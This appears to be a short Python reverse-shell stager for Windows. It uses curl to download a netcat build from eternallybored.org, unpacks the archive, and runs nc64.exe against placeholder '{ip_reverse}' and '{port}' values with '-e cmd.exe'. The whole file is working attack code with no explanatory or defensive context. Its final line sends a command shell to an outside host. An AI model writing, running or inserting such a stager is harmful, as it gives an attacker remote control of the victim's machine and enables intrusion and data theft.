import os
import shutil

os.system("curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip")
shutil.unpack_archive("netcat.zip")
os.chdir("netcat-1.11")
os.system("nc64.exe {ip_reverse} {port} -e cmd.exe")
